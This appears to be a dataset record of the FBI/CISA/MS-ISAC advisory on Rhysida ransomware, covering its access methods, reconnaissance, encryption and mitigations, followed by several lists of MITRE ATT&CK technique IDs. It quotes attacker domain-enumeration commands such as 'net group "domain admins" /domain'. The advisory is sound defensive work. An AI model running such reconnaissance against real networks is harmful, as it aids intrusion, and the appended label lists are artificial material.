Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K, 2.L, 2.R].
Forward log files to a hardened centralized logging server, preferably on a segmented network [CPG 2.F]. Review logging retention rates, such as for VPNs and network-based logs.
Consider adding an email banner to emails received from outside your organization [CPG 2.M].
Disable hyperlinks in received emails.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI, CISA, and the MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI, CISA, and the MS-ISAC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 6-15).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI, CISA, and the MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

CISA: #StopRansomware
CISA: #StopRansomware Vice Society
CISA: Known Exploited Vulnerabilities Catalog
NIST: CVE-2020-1472
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Secure by Design
CISA: Implementing Phishing-Resistant MFA
CISA: Guide to Securing Remote Access Software

REPORTING
FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Rhysida actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
Additional details requested include: a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host and network-based indicators.
FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other threat actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to promptly report ransomware incidents to the FBI’s Internet Crime Complaint Center (IC3) at Ic3.gov, a local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
REFERENCES

Microsoft: DEV-0832 (Vice Society) Opportunistic Ransomware Campaigns Impacting US Education Sector
FortiGuard Labs: Ransomware Roundup - Rhysida
Microsoft: Security Update Guide - CVE-2020-1472
Microsoft: Master File Table (Local File Systems)
SentinelOne: Rhysida
Secplicity: Scratching the Surface of Rhysida Ransomware
Cisco Talos: What Cisco Talos Knows about the Rhysida Ransomware
SOC Radar: Rhysida Ransomware Threat Profile
Sophos: A Threat Cluster’s Switch from Vice Society to Rhysida
Sophos: Vice Society - Rhysida IOCs (GitHub)
Check Point Research: Rhysida Ransomware - Activity and Ties to Vice Society
Microsoft: Command Line Process Auditing
Microsoft: Audit Process Tracking
Microsoft: Remote Credential Guard

ACKNOWLEDGEMENTS
Sophos contributed to this CSA.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI, CISA, and the MS-ISAC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, and the MS-ISAC.
VERSION HISTORY
November 15, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1657', 'T1055.002', 'T1219', 'T1482', 'T1016', 'T1190', 'T1021.004', 'T1087.002', 'T1069.002', 'T1069.001', 'T1018', 'T1112', 'T1587', 'T1564.003', 'T1078', 'T1070.004', 'T1566', 'T1059.001', 'T1033', 'T1003.003', 'T1021.001', 'T1486', 'T1059.003', 'T1070.001'}","






Actions to take today to mitigate malicious cyber activity:




Prioritize remediating known exploited vulnerabilities.
Enable multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.
Segment networks to prevent the spread of ransomware.







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders detailing various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint CSA to disseminate known Rhysida ransomware IOCs and TTPs identified through investigations as recently as September 2023. Rhysida—an emerging ransomware variant—has predominately been deployed against the education, healthcare, manufacturing, information technology, and government sectors since May 2023. The information in this CSA is derived from related incident response investigations and malware analysis of samples discovered on victim networks.
FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of Rhysida ransomware and other ransomware incidents.
Download the PDF version of this report:


AA23-319A #StopRansomware: Rhysida Ransomware
(PDF,       674.56 KB
  )


For a downloadable copy of IOCs, see:


AA23-319A STIX XML
(XML,       115.31 KB
  )




AA23-319A STIX JSON
(JSON,       65.69 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the ATT&CK Tactics and Techniques section for tables mapped to the threat actors’ activity.
Overview
Threat actors leveraging Rhysida ransomware are known to impact “targets of opportunity,” including victims in the education, healthcare, manufacturing, information technology, and government sectors. Open source reporting details similarities between Vice Society (DEV-0832),1, activity and the actors observed deploying Rhysida ransomware. Additionally, open source reporting,2, has confirmed observed instances of Rhysida actors operating in a ransomware-as-a-service (RaaS) capacity, where ransomware tools and infrastructure are leased out in a profit-sharing model. Any ransoms paid are then split between the group and the affiliates.
For additional information on Vice Society actors and associated activity, see the joint CSA #StopRansomware: Vice Society.
Initial Access
Rhysida actors have been observed leveraging external-facing remote services to initially access and persist within a network. Remote services, such as virtual private networks (VPNs), allow users to connect to internal enterprise network resources from external locations. Rhysida actors have commonly been observed authenticating to internal VPN access points with compromised valid credentials, notably due to organizations lacking MFA enabled by default. Additionally, actors have been observed exploiting Zerologon (CVE-2020-1472)—a critical elevation of privileges vulnerability in Microsoft’s Netlogon Remote Protocol,—as well as conducting successful phishing attempts,. Note: Microsoft released a patch for CVE-2020-1472 on August 11, 2020.,3,
Living off the Land
Analysis identified Rhysida actors using living off the land techniques, such as creating Remote Desktop Protocol (RDP) connections for lateral movement, establishing VPN access, and utilizing PowerShell,. Living off the land techniques include using native (built into the operating system) network administration tools to perform operations. This allows the actors to evade detection by blending in with normal Windows systems and network activities.
Ipconfig, whoami, nltest, and several net commands have been used to enumerate victim environments and gather information about domains. In one instance of using compromised credentials, actors leveraged net commands within PowerShell to identify logged-in users and performed reconnaissance on network accounts within the victim environment. Note: The following commands were not performed in the exact order listed.

net user,username, /domain,
net group “domain computers” /domain,
net group “domain admins” /domain,
net localgroup administrators,

Analysis of the master file table (MFT),4, identified the victim system generated the ntuser.dat registry hive, which was created when the compromised user logged in to the system for the first time. This was considered anomalous due to the baseline of normal activity for that particular user and system. Note: The MFT resides within the New Technology File System (NTFS) and houses information about a file including its size, time and date stamps, permissions, and data content.
Leveraged Tools
Table 1 lists legitimate tools Rhysida actors have repurposed for their operations. The legitimate tools listed in this joint CSA are all publicly available. Use of these tools should not be attributed as malicious without analytical evidence to support they are used at the direction of or controlled by threat actors.
Disclaimer: Organizations are encouraged to investigate and vet use of these tools prior to performing remediation actions.

Rhysida Ransomware Characteristics
Execution
In one investigation, Rhysida actors created two folders in the C:\ drive labeled in and out, which served as a staging directory (central location) for hosting malicious executables. The in folder contained file names in accordance with host names on the victim’s network, likely imported through a scanning tool. The out folder contained various files listed in Table 2 below. Rhysida actors deployed these tools and scripts to assist system and network-wide encryption.

Rhysida ransomware uses a Windows 64-bit Portable Executable (PE) or common object file format (COFF) compiled using MinGW via the GNU Compiler Collection (GCC), which supports various programming languages such as C, C++, and Go. The cryptographic ransomware application first injects the PE into running processes on the compromised system,. Additionally, third-party researchers identified evidence of Rhysida actors developing custom tools with program names set to “Rhysida-0.1”,.
Encryption
After mapping the network, the ransomware encrypts data using a 4096-bit RSA encryption key with a ChaCha20 algorithm,. The algorithm features a 256-bit key, a 32-bit counter, and a 96-bit nonce along with a four-by-four matrix of 32-bit words in plain text. Registry modification commands, are not obfuscated, displayed as plain-text strings and executed via cmd.exe.
Rhysida’s encryptor runs a file to encrypt and modify all encrypted files to display a .rhysida extension.,5, Following encryption, a PowerShell command deletes the binary, from the network using a hidden command window,. The Rhysida encryptor allows arguments -d (select a directory) and -sr (file deletion), defined by the authors of the code as parseOptions.,6, After the lines of binary strings complete their tasks, they delete themselves through the control panel to evade detection.
Data Extortion
Rhysida actors reportedly engage in “double extortion”,—demanding a ransom payment to decrypt victim data and threatening to publish the sensitive exfiltrated data unless the ransom is paid.,5,7, Rhysida actors direct victims to send ransom payments in Bitcoin to cryptocurrency wallet addresses provided by the threat actors. As shown in Figure 1, Rhysida ransomware drops a ransom note named “CriticalBreachDetected” as a PDF file—the note provides each company with a unique code and instructions to contact the group via a Tor-based portal.

 

Figure 1: Rhysida Ransom Note

Identified in analysis and also listed in open source reporting, the contents of the ransom note are embedded as plain-text in the ransom binary, offering network defenders an opportunity to deploy string-based detection for alerting on evidence of the ransom note. Rhysida threat actors may target systems that do not use command-line operating systems. The format of the PDF ransom notes could indicate that Rhysida actors only target systems that are compatible with handling PDF documents.,8,
INDICATORS OF COMPROMISE
On November 10, 2023, Sophos published TTPs and IOCs identified from analysis conducted for six separate incidents.,9, The C2 IP addresses listed in Table 3 were derived directly from Sophos’ investigations and are listed on GitHub among other indicators.,10,

Additional IOCs were obtained from FBI, CISA, and the MS-ISAC’s investigations and analysis. The email addresses listed in Table 4 are associated with Rhysida actors’ operations. Rhysida actors have been observed creating Onion Mail email accounts for services or victim communication, commonly in the format:,First Name,Last Name,@onionmail,.,org.

Rhysida actors have also been observed using the following files and executables listed in Table 5 to support their operations.
Disclaimer: Organizations are encouraged to investigate the use of these files for related signs of compromise prior to performing remediation actions.

MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 6-15 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Additional notable TTPs have been published by the Check Point Incident Response Team.,11,










MITIGATIONS
FBI, CISA, and the MS-ISAC recommend that organizations implement the mitigations below to improve your organization’s cybersecurity posture. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
These mitigations apply to all critical infrastructure organizations and network defenders. FBI, CISA, and the MS-ISAC recommend incorporating secure-by-design and -default principles, limiting the impact of ransomware techniques and strengthening overall security posture. For more information on secure by design, see CISA’s Secure by Design webpage.

Require phishing-resistant MFA for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems,CPG 2.H,.
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally,CPG 2.N,.
Implement verbose and enhanced logging within processes such as command line auditing,12, and process tracking,13,.
Restrict the use of PowerShell using Group Policy and only grant access to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems should be permitted to use PowerShell,CPG 2.E,.
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities,CPG 1.E, 2.S, 2.T,.
Enable enhanced PowerShell logging,CPG 2.T, 2.U,.

PowerShell logs contain valuable data, including historical operating system and registry interaction and possible TTPs of a threat actor’s PowerShell use.
Ensure PowerShell instances (using the latest version) have module, script block, and transcription logging enabled (e.g., enhanced logging).
The two logs that record PowerShell activity are the PowerShell Windows event log and the PowerShell operational log. FBI, CISA, and the MS-ISAC recommend turning on these two Windows event logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as possible.


Restrict the use of RDP and other remote desktop services to known user accounts and groups. If RDP is necessary, apply best practices such as,CPG 2.W,:

Implement MFA for privileged accounts using RDP.
Use Remote Credential Guard,14, to protect credentials, particularly domain administrator or other high value accounts.
Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Log RDP login attempts.


Secure remote access tools by:

Implementing application controls to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent the installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important as antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.
Apply the recommendations in CISA's joint Guide to Securing Remote Access Software.



In addition, FBI, CISA, and the MS-ISAC recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems,CPG 1.E,.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement,CPG 2.F,.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a network monitoring tool. To aid in detecting ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host,CPG 3.A,.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege (PoLP),CPG 2.E,.
Implement time-based access for accounts set at the admin level and higher,CPG 2.A, 2.E,. For example, the just-in-time (JIT) access method provisions privileged access when needed and can support the enforcement of PoLP (as well as the zero trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the AD level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, or the cloud).
Maintain offline backups of data and regularly maintain backups and their restoration (daily or weekly at minimum). By instituting this practice, organizations limit the severity of disruption to business operations,CPG 2.R,.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure,CPG 2.K, 2.L, 2.R,.
Forward log files to a hardened centralized logging server, preferably on a segmented network,CPG 2.F,. Review logging retention rates, such as for VPNs and network-based logs.
Consider adding an email banner to emails received from outside your organization,CPG 2.M,.
Disable hyperlinks in received emails.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI, CISA, and the MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI, CISA, and the MS-ISAC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 6-15).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI, CISA, and the MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

CISA: #StopRansomware
CISA: #StopRansomware Vice Society
CISA: Known Exploited Vulnerabilities Catalog
NIST: CVE-2020-1472
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Secure by Design
CISA: Implementing Phishing-Resistant MFA
CISA: Guide to Securing Remote Access Software

REPORTING
FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Rhysida actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
Additional details requested include: a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host and network-based indicators.
FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other threat actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to promptly report ransomware incidents to the FBI’s Internet Crime Complaint Center (IC3) at Ic3.gov, a local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
REFERENCES

Microsoft: DEV-0832 (Vice Society) Opportunistic Ransomware Campaigns Impacting US Education Sector
FortiGuard Labs: Ransomware Roundup - Rhysida
Microsoft: Security Update Guide - CVE-2020-1472
Microsoft: Master File Table (Local File Systems)
SentinelOne: Rhysida
Secplicity: Scratching the Surface of Rhysida Ransomware
Cisco Talos: What Cisco Talos Knows about the Rhysida Ransomware
SOC Radar: Rhysida Ransomware Threat Profile
Sophos: A Threat Cluster’s Switch from Vice Society to Rhysida
Sophos: Vice Society - Rhysida IOCs (GitHub)
Check Point Research: Rhysida Ransomware - Activity and Ties to Vice Society
Microsoft: Command Line Process Auditing
Microsoft: Audit Process Tracking
Microsoft: Remote Credential Guard

ACKNOWLEDGEMENTS
Sophos contributed to this CSA.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI, CISA, and the MS-ISAC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, and the MS-ISAC.
VERSION HISTORY
November 15, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","['T1070', 'T1018', 'T1119', 'T1583', 'T1482', 'T1531', 'T1074', 'T1587', 'T1218', 'T1059', 'T1588', 'T1219', 'T1029', 'T1027', 'T1566', 'T1573', 'T1083', 'T1591', 'T1078', 'T1486', 'T1562', 'T1021', 'T1585', 'T1213']","{'T1036.004', 'T1597.002', 'T1588.002', 'T1562.003', 'T1021.001', 'T1078.002', 'T1027.004', 'T1055', 'T1111', 'T1563', 'T1016', 'T1036.005', 'T1588.001', 'T1548.003', 'T1074.001', 'T1059.003', 'T1068', 'T1548', 'T1070.007', 'T1585.002', 'T1105', 'T1490', 'T1599', 'T1562.001', 'T1583.005', 'T1084', 'T1087', 'T1076', 'T1087.002', 'T1027', 'T1562.002', 'T1110.004', 'T1009', 'T1070.001', 'T1489', 'T1133', 'T1070.004', 'T1657', 'T1083', 'T1597.001', 'T1548.005', 'T1556.006', 'T1578.004', 'T1190', 'T1486', 'T1078', 'T1566.003', 'T1086', 'T1562.010', 'T1553.006', 'T1518.001', 'T1096'}","{'T1070', 'T1036.004', 'T1597.002', 'T1588.002', 'T1589', 'T1562.003', 'T1078.002', 'T1021.001', 'T1027.004', 'T1055', 'T1111', 'T1016', 'T1036.005', 'T1548.003', 'T1562.008', 'T1074.001', 'T1484.001', 'T1082', 'T1059.003', 'T1068', 'T1548', 'T1067', 'T1106', 'T1585.002', 'T1059', 'T1490', 'T1599', 'T1562.001', 'T1485', 'T1583.005', 'T1087', 'T1076', 'T1059.001', 'T1027', 'T1550.002', 'T1016, T1087.002', 'T1070.003', 'T1110.004', 'T1562.002', 'T1486, T1070.004', 'T1078, T1133', 'T1070.001', 'T1087.002, T1069.002, T1069.001', 'T1580', 'T1608.002', 'T1133', 'T1070.004', 'T1021.001, T1133', 'T1083', 'T1657', 'T1597.001', 'T1480.001', 'T1078.004', 'T1548.005', 'T1556.006', 'T1190', 'T1096, T1564.004', 'T1202', 'T1486', 'T1078', 'T1566.002', 'T1086', 'T1562', 'T1553.006', 'T1518.001', 'T1003'}","{'T1070', 'T1589', 'T1005', 'T1486, T1059, T1106', 'T1055', 'T1595', 'T1486, T1071, T1589', 'T1548, T1077', 'T1563', 'T1557', 'T1590, T1589, T1059, T1071, T1566', 'T1210, T1076, T1021, T1086', 'T1646', 'T1112', 'T1059, T1057', 'T1569', 'T1204', 'T1587', 'T1003, T1083, T1482', 'T1078, T1203, T1566', 'T1059', 'T1218', 'T1588', 'T1016, T1076', 'T1589, T1592, T1595, T1596, T1597, T1598', 'T1490', 'T1484', 'T1203', 'T1059.001', 'T1078, T1087, T1057', 'T1016, T1033, T1087', 'T1589, T1588, T1486', 'T1486, T1070.004', 'T1110', 'T1486, T1489', 'T1486, T1070', 'T1074, T1105', 'T1133', 'T1071', 'T1556', 'T1202', 'T1078, T1078.003', 'T1564', 'T1486', 'T1078', 'T1210', 'T1560', 'T1562', 'T1021', 'T1554', 'T1585', 'T1040, T1071, T1569', 'T1213'}"
